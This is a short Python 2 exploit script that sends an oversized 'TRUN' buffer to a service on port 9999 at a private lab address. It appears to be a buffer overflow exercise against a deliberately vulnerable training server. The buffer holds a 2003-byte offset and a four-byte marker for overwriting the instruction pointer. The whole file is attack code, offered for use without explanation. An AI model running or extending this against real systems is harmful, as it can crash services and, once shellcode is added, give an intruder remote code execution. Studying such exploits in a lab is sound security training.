#!/usr/bin/python
import socket
import os
import sys

crash = "A" * 2003 + "B" * 4 + "C" * (5000-2003-4)

buffer="TRUN /.:/"
buffer+= crash + "\r\n"
print "[*] Sending exploit!"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.100.120", 9999))
expl.send(buffer)
expl.close()

